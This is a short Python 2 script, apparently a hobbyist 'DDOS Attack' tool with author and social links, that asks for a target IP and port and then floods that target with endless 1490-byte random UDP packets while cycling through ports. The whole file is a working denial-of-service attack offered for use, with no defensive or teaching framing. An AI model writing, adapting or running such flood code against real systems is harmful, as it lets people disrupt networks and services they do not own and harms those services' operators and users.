import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
reg = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
load = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDOS Attack | lolcat")
print ("author      :  ANONYMOUS")
print ("website     :  https://dev-regaanthamimprogramming.pantheonsite.io")
print ("You Tube    :  https://www.youtube.com/channel/UCpKJnmkqAYVqLbl3ZWhh4yA")
print ("github      :  https://github.com/noobforanonymous")

rt = raw_input("Enter Your Target IP : ")
hack = input("Enter Any Port       : ")

os.system("clear")
os.system("figlet Attack Started  |  lolcat")
print ("[                    ] wait 0% loading")
time.sleep(5)
print ("[=====               ] wait 25% loading")
time.sleep(5)
print ("[==========          ] wait 50% loading")
time.sleep(5)
print ("[===============     ] wait 75% loading")
time.sleep(5)
print ("[====================] Now 100% Completed to start attacking")
time.sleep(3)
send = 0
while True:
     reg.sendto(load, (rt,hack))
     send = send + 1
     hack = hack + 1
     print "Send %s packet to %s throught port:%s"%(send,rt,hack)
     if hack == 65534:
       hack = 1

